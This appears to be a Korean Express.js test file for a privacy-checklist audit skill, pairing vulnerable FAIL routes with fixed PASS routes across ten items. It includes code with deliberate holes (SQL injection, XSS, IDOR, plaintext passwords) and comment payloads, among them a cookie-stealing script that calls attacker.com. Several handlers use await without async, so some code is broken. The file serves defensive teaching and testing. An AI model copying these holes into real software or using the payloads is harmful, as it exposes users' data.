// ========================================
// 개인정보보호 10대 체크리스트 테스트 코드
// ========================================
// 각 항목별로 PASS/FAIL 예시를 포함합니다.

const express = require('express');
const app = express();

// ========================================
// A. 인증 및 권한 관리 (4개)
// ========================================

// [1] ❌ FAIL - 비밀번호 정책 강제화
app.post('/register-weak', async (req, res) => {
  const { email, password } = req.body;
  
  // ❌ 비밀번호 검증 없음
  // 사용자가 "1234"나 "password" 같은 약한 비밀번호 사용 가능
  const hash = await bcrypt.hash(password, 10);
  
  await User.create({ email, password_hash: hash });
  res.json({ success: true });
});

// [1] ✅ PASS - 비밀번호 정책 강제화
function validatePassword(password) {
  const minLength = 8;
  const hasUpper = /[A-Z]/.test(password);
  const hasLower = /[a-z]/.test(password);
  const hasNumber = /[0-9]/.test(password);
  const hasSpecial = /[!@#$%^&*(),.?":{}|<>]/.test(password);
  
  return password.length >= minLength && 
         hasUpper && hasLower && hasNumber && hasSpecial;
}

app.post('/register-strong', async (req, res) => {
  const { email, password } = req.body;
  
  // ✅ 비밀번호 정책 검증
  if (!validatePassword(password)) {
    return res.status(400).json({ 
      error: '영문 대소문자, 숫자, 특수문자를 포함한 8자리 이상 필요' 
    });
  }
  
  const hash = await bcrypt.hash(password, 12);
  await User.create({ email, password_hash: hash });
  res.json({ success: true });
});

// ========================================

// [2] ❌ FAIL - 로그인 시도 제한
app.post('/login-unlimited', async (req, res) => {
  const { email, password } = req.body;
  
  const user = await User.findOne({ email });
  
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  const isValid = await bcrypt.compare(password, user.password_hash);
  
  if (!isValid) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // ❌ 로그인 시도 횟수 제한 없음
  // ❌ 무제한으로 비밀번호 재시도 가능
  // ❌ 크리덴셜 스터핑 공격에 취약
  
  req.session.userId = user.id;
  res.json({ success: true });
});

// [2] ✅ PASS - 로그인 시도 제한
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15분
  max: 5,  // 5회 제한
  message: '로그인 시도 횟수를 초과했습니다. 15분 후 다시 시도하세요.'
});

app.post('/login-limited', loginLimiter, async (req, res) => {
  const { email, password } = req.body;
  
  const user = await User.findOne({ email });
  
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // ✅ 계정 잠금 확인
  if (user.lockUntil && user.lockUntil > Date.now()) {
    return res.status(423).json({ 
      error: '계정이 잠겼습니다. 나중에 다시 시도하세요.' 
    });
  }
  
  const isValid = await bcrypt.compare(password, user.password_hash);
  
  if (!isValid) {
    // ✅ 실패 횟수 증가
    user.loginAttempts = (user.loginAttempts || 0) + 1;
    
    // ✅ 5회 실패 시 계정 잠금
    if (user.loginAttempts >= 5) {
      user.lockUntil = Date.now() + (15 * 60 * 1000);  // 15분
    }
    
    await user.save();
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // ✅ 로그인 성공 시 카운터 리셋
  user.loginAttempts = 0;
  user.lockUntil = null;
  await user.save();
  
  req.session.userId = user.id;
  res.json({ success: true });
});

// ========================================

// [3] ❌ FAIL - 권한 검증 (IDOR)
app.get('/api/user/:userId', (req, res) => {
  const userId = req.params.userId;
  
  // ❌ 로그인한 사용자 ID와 비교하지 않음
  // ❌ URL 파라미터를 1234 → 1235로 변경하면 타인 정보 조회 가능!
  const user = await User.findById(userId);
  
  res.json({
    id: user.id,
    name: user.name,
    email: user.email,
    phone: user.phone,
    address: user.address
  });
});

app.get('/api/order/:orderId', (req, res) => {
  const orderId = req.params.orderId;
  
  // ❌ 권한 검증 없음
  const order = await Order.findById(orderId);
  
  res.json(order);
});

// [3] ✅ PASS - 권한 검증 (IDOR)
app.get('/api/user/:userId', authenticateUser, (req, res) => {
  const requestedUserId = req.params.userId;
  const currentUserId = req.user.id;  // 세션에서 추출
  
  // ✅ 수평적 권한 검증
  if (requestedUserId !== currentUserId && req.user.role !== 'ADMIN') {
    return res.status(403).json({ 
      error: '본인의 정보만 조회할 수 있습니다' 
    });
  }
  
  const user = await User.findById(requestedUserId);
  
  res.json({
    id: user.id,
    name: user.name,
    email: user.email
  });
});

app.get('/api/order/:orderId', authenticateUser, (req, res) => {
  const orderId = req.params.orderId;
  
  // ✅ DB 쿼리에 user_id 조건 포함
  const order = await Order.findOne({
    id: orderId,
    userId: req.user.id  // 본인 주문만 조회
  });
  
  if (!order) {
    return res.status(404).json({ error: '주문을 찾을 수 없습니다' });
  }
  
  res.json(order);
});

// ========================================

// [4] ❌ FAIL - 세션 관리
const session = require('express-session');

app.use(session({
  secret: 'keyboard cat',  // ❌ 약한 시크릿
  resave: false,
  saveUninitialized: true,
  cookie: {
    maxAge: 365 * 24 * 60 * 60 * 1000  // ❌ 1년
  }
}));

app.post('/logout-weak', (req, res) => {
  // ❌ 클라이언트 쿠키만 삭제
  res.clearCookie('sessionId');
  
  // ❌ 서버의 세션은 여전히 유효
  // ❌ 세션 ID를 알면 계속 사용 가능
  
  res.json({ success: true });
});

// [4] ✅ PASS - 세션 관리
const RedisStore = require('connect-redis')(session);

app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET,  // ✅ 환경변수
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,   // ✅ JavaScript 접근 차단
    secure: true,     // ✅ HTTPS만 전송
    sameSite: 'strict',
    maxAge: 30 * 60 * 1000  // ✅ 30분
  },
  rolling: true  // ✅ 활동 시 자동 연장
}));

app.post('/logout-strong', (req, res) => {
  // ✅ 서버 세션 완전 파기
  req.session.destroy((err) => {
    if (err) {
      return res.status(500).json({ error: 'Logout failed' });
    }
    
    res.clearCookie('sessionId');
    res.json({ success: true });
  });
});

// ========================================
// B. 입력 데이터 검증 (2개)
// ========================================

// [5] ❌ FAIL - SQL Injection 방어
app.post('/search-vulnerable', (req, res) => {
  const keyword = req.query.q;
  
  // ❌ 동적 쿼리로 SQL Injection 취약
  const query = `SELECT * FROM posts WHERE title LIKE '%${keyword}%'`;
  
  const results = await db.query(query);
  
  // 공격 예시:
  // ?q=' UNION SELECT id,email,password_hash FROM users--
  // → 모든 사용자 정보 유출
  
  res.json(results);
});

app.post('/login-sql-injection', (req, res) => {
  const { email, password } = req.body;
  
  // ❌ Template Literal로 SQL Injection
  const query = `
    SELECT * FROM users 
    WHERE email = '${email}' 
    AND password = '${password}'
  `;
  
  const user = await db.query(query);
  
  // 공격:
  // email: admin@example.com' OR '1'='1
  // password: ' OR '1'='1
  // → 로그인 우회
  
  if (user) {
    req.session.userId = user.id;
    res.json({ success: true });
  }
});

// [5] ✅ PASS - SQL Injection 방어
app.post('/search-safe', (req, res) => {
  const keyword = req.query.q;
  
  // ✅ Prepared Statement
  const query = 'SELECT * FROM posts WHERE title LIKE ?';
  const results = await db.query(query, [`%${keyword}%`]);
  
  res.json(results);
});

app.post('/login-safe', (req, res) => {
  const { email, password } = req.body;
  
  // ✅ Parameterized Query
  const query = 'SELECT * FROM users WHERE email = ?';
  const users = await db.query(query, [email]);
  
  if (users.length === 0) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  const user = users[0];
  const isValid = await bcrypt.compare(password, user.password_hash);
  
  if (!isValid) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  req.session.userId = user.id;
  res.json({ success: true });
});

// ✅ ORM 사용 (더 안전)
app.get('/users-orm', (req, res) => {
  const email = req.query.email;
  
  // ✅ Sequelize ORM
  const user = await User.findOne({ 
    where: { email: email } 
  });
  
  res.json(user);
});

// ========================================

// [6] ❌ FAIL - XSS 방어
app.get('/post/:id', (req, res) => {
  const post = await Post.findById(req.params.id);
  const comments = await Comment.find({ postId: req.params.id });
  
  let html = `<h1>${post.title}</h1>`;
  html += `<div>${post.content}</div>`;
  html += '<div class="comments">';
  
  comments.forEach(comment => {
    // ❌ 사용자 입력을 그대로 HTML에 삽입
    html += `<p>${comment.content}</p>`;
    html += `<small>${comment.author}</small>`;
  });
  
  html += '</div>';
  
  // 공격 예시:
  // comment.content = "<script>fetch('https://attacker.com/steal?c=' + document.cookie)</script>"
  // → 세션 쿠키 탈취
  
  res.send(html);
});

// 클라이언트 사이드 XSS
app.get('/profile.html', (req, res) => {
  res.send(`
    <script>
      // ❌ innerHTML 사용
      const username = new URLSearchParams(window.location.search).get('name');
      document.getElementById('welcome').innerHTML = 'Welcome ' + username;
      
      // 공격: ?name=<img src=x onerror="alert(document.cookie)">
    </script>
  `);
});

// [6] ✅ PASS - XSS 방어
const escapeHtml = require('escape-html');
const DOMPurify = require('isomorphic-dompurify');

app.get('/post/:id/safe', (req, res) => {
  const post = await Post.findById(req.params.id);
  const comments = await Comment.find({ postId: req.params.id });
  
  // ✅ HTML 이스케이프
  let html = `<h1>${escapeHtml(post.title)}</h1>`;
  html += `<div>${escapeHtml(post.content)}</div>`;
  html += '<div class="comments">';
  
  comments.forEach(comment => {
    // ✅ DOMPurify로 sanitize
    const cleanContent = DOMPurify.sanitize(comment.content);
    html += `<p>${cleanContent}</p>`;
    html += `<small>${escapeHtml(comment.author)}</small>`;
  });
  
  html += '</div>';
  res.send(html);
});

// ✅ 템플릿 엔진 사용 (EJS)
app.get('/post/:id/ejs', (req, res) => {
  const post = await Post.findById(req.params.id);
  
  // ✅ EJS 자동 이스케이프
  res.render('post', { post });
  
  // post.ejs:
  // <h1><%= post.title %></h1>  <!-- 자동 이스케이프 -->
});

// ✅ 클라이언트 사이드 - textContent
app.get('/profile-safe.html', (req, res) => {
  res.send(`
    <script>
      // ✅ textContent 사용
      const username = new URLSearchParams(window.location.search).get('name');
      document.getElementById('welcome').textContent = 'Welcome ' + username;
      
      // 스크립트가 실행되지 않고 문자로 표시됨
    </script>
  `);
});

// ========================================
// C. 데이터 암호화 (2개)
// ========================================

// [7] ❌ FAIL - 중요 정보 암호화
app.post('/register-plaintext', async (req, res) => {
  const { name, email, password, ssn, account } = req.body;
  
  // ❌ 비밀번호 평문 저장
  // ❌ 주민등록번호 평문 저장
  // ❌ 계좌번호 평문 저장
  await User.create({
    name,
    email,
    password: password,  // ❌ 개인정보보호법 위반
    ssn: ssn,            // ❌ 5천만원 이하 과태료
    account: account     // ❌ 형사처벌 가능
  });
  
  res.json({ success: true });
});

const crypto = require('crypto');

app.post('/register-weak-crypto', async (req, res) => {
  const { password } = req.body;
  
  // ❌ MD5 해시 (취약)
  const hash = crypto.createHash('md5').update(password).digest('hex');
  
  // ❌ SHA-256 Salt 없음 (무지개 테이블 공격 취약)
  const hash2 = crypto.createHash('sha256').update(password).digest('hex');
  
  await User.create({ password_hash: hash });
});

// [7] ✅ PASS - 중요 정보 암호화
const bcrypt = require('bcrypt');

function encryptPII(data, secretKey) {
  const algorithm = 'aes-256-gcm';
  const key = crypto.scryptSync(secretKey, 'salt', 32);
  const iv = crypto.randomBytes(16);
  
  const cipher = crypto.createCipheriv(algorithm, key, iv);
  
  let encrypted = cipher.update(data, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  
  const authTag = cipher.getAuthTag();
  
  return {
    encrypted,
    iv: iv.toString('hex'),
    authTag: authTag.toString('hex')
  };
}

app.post('/register-encrypted', async (req, res) => {
  const { name, email, password, ssn, account } = req.body;
  
  // ✅ 비밀번호: bcrypt (일방향)
  const passwordHash = await bcrypt.hash(password, 12);
  
  // ✅ 주민번호: AES-256-GCM (양방향)
  const ssnEncrypted = encryptPII(ssn, process.env.ENCRYPTION_KEY);
  
  // ✅ 계좌번호: AES-256-GCM
  const accountEncrypted = encryptPII(account, process.env.ENCRYPTION_KEY);
  
  await User.create({
    name,
    email,
    password_hash: passwordHash,
    ssn_encrypted: ssnEncrypted.encrypted,
    ssn_iv: ssnEncrypted.iv,
    ssn_tag: ssnEncrypted.authTag,
    account_encrypted: accountEncrypted.encrypted,
    account_iv: accountEncrypted.iv,
    account_tag: accountEncrypted.authTag
  });
  
  res.json({ success: true });
});

// ========================================

// [8] ❌ FAIL - HTTPS 적용
const http = require('http');

// ❌ HTTP만 사용
http.createServer(app).listen(3000);

// ❌ 로그인, 회원가입, 결제 정보가 평문으로 전송
// ❌ 중간자 공격(MITM)에 취약
// ❌ 안전성 확보조치 기준 제5조 위반

// [8] ✅ PASS - HTTPS 적용
const https = require('https');
const fs = require('fs');

const options = {
  key: fs.readFileSync('/path/to/private-key.pem'),
  cert: fs.readFileSync('/path/to/certificate.pem')
};

// ✅ HTTPS 서버
https.createServer(options, app).listen(443);

// ✅ HTTP → HTTPS 리디렉션
http.createServer((req, res) => {
  res.writeHead(301, { 
    Location: `https://${req.headers.host}${req.url}` 
  });
  res.end();
}).listen(80);

// ✅ HSTS 헤더
app.use((req, res, next) => {
  res.setHeader('Strict-Transport-Security', 
    'max-age=31536000; includeSubDomains; preload');
  next();
});

// ========================================
// D. 서버 및 관리적 보안 (2개)
// ========================================

// [9] ❌ FAIL - 디렉토리 리스팅
app.use(express.static('public'));
app.use('/uploads', express.static('uploads'));

// ❌ http://example.com/uploads/ 접근 시 파일 목록 노출
// ❌ 업로드된 사용자 신분증, 통장 사본 등이 나열됨

const serveIndex = require('serve-index');
app.use('/files', serveIndex('files'));
// ❌ 파일 브라우징 활성화

// [9] ✅ PASS - 디렉토리 리스팅 제거
app.use(express.static('public', {
  dotfiles: 'deny',
  index: false  // ✅ 디렉토리 인덱스 비활성화
}));

app.use('/uploads', express.static('uploads', {
  index: false
}));

// ✅ 특정 파일만 제공
const path = require('path');

app.get('/download/:filename', (req, res) => {
  const filename = path.basename(req.params.filename);
  
  // ✅ 화이트리스트 검증
  const allowedExts = ['.pdf', '.jpg', '.png'];
  const ext = path.extname(filename).toLowerCase();
  
  if (!allowedExts.includes(ext)) {
    return res.status(403).send('Forbidden');
  }
  
  const filePath = path.join(__dirname, 'uploads', filename);
  res.sendFile(filePath);
});

// ========================================

// [10] ❌ FAIL - 관리자 페이지 접근 통제
app.get('/admin', (req, res) => {
  // ❌ IP 제한 없음
  if (req.user && req.user.role === 'ADMIN') {
    res.render('admin/dashboard');
  } else {
    res.status(403).send('Forbidden');
  }
  
  // ❌ 외부 인터넷에서 접근 가능
  // ❌ 브루트포스 공격 가능
});

// [10] ✅ PASS - 관리자 페이지 접근 통제
const ipRangeCheck = require('ip-range-check');

const ADMIN_ALLOWED_IPS = [
  '192.168.1.0/24',  // 사내망
  '10.0.0.0/8',      // VPN
];

function checkAdminIP(req, res, next) {
  const clientIP = req.ip;
  
  // ✅ IP 화이트리스트 확인
  if (!ipRangeCheck(clientIP, ADMIN_ALLOWED_IPS)) {
    return res.status(403).json({ 
      error: '관리자 페이지는 허가된 네트워크에서만 접근 가능합니다' 
    });
  }
  
  next();
}

// ✅ 모든 관리자 경로에 IP 제한 적용
app.use('/admin', checkAdminIP, authenticateAdmin);

app.get('/admin', (req, res) => {
  res.render('admin/dashboard');
});

// ========================================
// 테스트 지침
// ========================================
/*
이 파일로 privacy-checklist skill을 테스트하세요:

1. 파일 업로드
2. "이 코드를 개인정보보호 10대 항목으로 점검해줘"
3. 예상 결과 확인:

📋 개인정보보호 점검 결과

요약:
- 총 점검 항목: 10개
- ✅ PASS: 10개 (PASS 코드 참조)
- ❌ FAIL: 10개 (FAIL 코드 참조)

A. 인증 및 권한 관리
[1] ❌ FAIL - 비밀번호 정책 (register-weak)
[1] ✅ PASS - 비밀번호 정책 (register-strong)
[2] ❌ FAIL - 로그인 제한 (login-unlimited)
[2] ✅ PASS - 로그인 제한 (login-limited)
[3] ❌ FAIL - IDOR (/api/user/:userId)
[3] ✅ PASS - IDOR (권한 검증 포함)
[4] ❌ FAIL - 세션 관리 (logout-weak)
[4] ✅ PASS - 세션 관리 (logout-strong)

B. 입력 데이터 검증
[5] ❌ FAIL - SQL Injection (search-vulnerable)
[5] ✅ PASS - SQL Injection (search-safe, ORM)
[6] ❌ FAIL - XSS (innerHTML)
[6] ✅ PASS - XSS (escapeHtml, textContent)

C. 데이터 암호화
[7] ❌ FAIL - 암호화 (평문, MD5)
[7] ✅ PASS - 암호화 (bcrypt, AES-256)
[8] ❌ FAIL - HTTPS (http.createServer)
[8] ✅ PASS - HTTPS (https.createServer, HSTS)

D. 서버 및 관리적 보안
[9] ❌ FAIL - 디렉토리 리스팅 (serveIndex)
[9] ✅ PASS - 디렉토리 리스팅 (index: false)
[10] ❌ FAIL - 관리자 접근 (IP 제한 없음)
[10] ✅ PASS - 관리자 접근 (IP 화이트리스트)
*/
